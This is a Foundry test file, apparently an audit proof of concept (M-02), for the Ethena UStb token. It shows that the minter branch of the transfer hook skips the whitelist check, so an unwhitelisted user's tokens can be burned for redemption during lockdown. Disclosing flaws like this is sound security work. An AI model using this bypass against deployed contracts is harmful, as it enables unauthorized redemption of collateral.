// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {UStb} from "../contracts/ustb/UStb.sol";
import {IUStbDefinitions} from "../contracts/ustb/IUStbDefinitions.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol"; 

/// @title M-02: Non-whitelisted users can redeem collateral by bypassing checks
/// @notice An unwhitelisted user can successfully submit a redemption request when transferState == WHITELIST_ENABLED.
/// The _beforeTokenTransfer hook omits the whitelist check in the MINTER_CONTRACT branch, 
/// allowing the minter to burn tokens on behalf of unauthorized users.
/// @author 0xSchutze
contract Ethena_M02_PoC is Test {
    UStb public ustb;
    
    address public admin = makeAddr("admin");
    address public alice = makeAddr("alice"); 
    address public minter = makeAddr("minter");

    bytes32 public constant DEFAULT_ADMIN_ROLE = 0x00;
    bytes32 public constant MINTER_CONTRACT = keccak256("MINTER_CONTRACT");
    bytes32 public constant WHITELISTED_ROLE = keccak256("WHITELISTED_ROLE");
    bytes32 public constant BLACKLISTED_ROLE = keccak256("BLACKLISTED_ROLE");

    uint256 public constant ALICE_BALANCE = 1000e18;

    function setUp() public {
        UStb implementation = new UStb();

        bytes memory initData = abi.encodeWithSelector(UStb.initialize.selector, admin, minter);                                                                                                                                              
        ERC1967Proxy proxy = new ERC1967Proxy(address(implementation), initData);   
        ustb = UStb(address(proxy));

        vm.startPrank(minter);
        ustb.mint(alice, ALICE_BALANCE);
        vm.stopPrank();
    }

    /// @notice MINTER_CONTRACT branch in _beforeTokenTransfer omits the whitelist check, allowing unwhitelisted users to redeem during lockdown.
    function test_M02_WhitelistBypass() public {
        // Alice (unwhitelisted) approves the minter to burn her tokens.
        vm.prank(alice);
        ustb.approve(minter, ALICE_BALANCE); 

        // Admin applies protocol-wide whitelist restriction.
        vm.prank(admin);
        ustb.updateTransferState(IUStbDefinitions.TransferState.WHITELIST_ENABLED);

        // The MINTER_CONTRACT branch in _beforeTokenTransfer omits the whitelist check.
        // Therefore, the minter can burn Alice's tokens despite the lockdown.
        vm.prank(minter);
        ustb.burnFrom(alice, ALICE_BALANCE); 
        
        uint256 balanceAfter = ustb.balanceOf(alice);
        assertEq(balanceAfter, 0, "balance must be zero: minter bypassed whitelist check");
    }
}
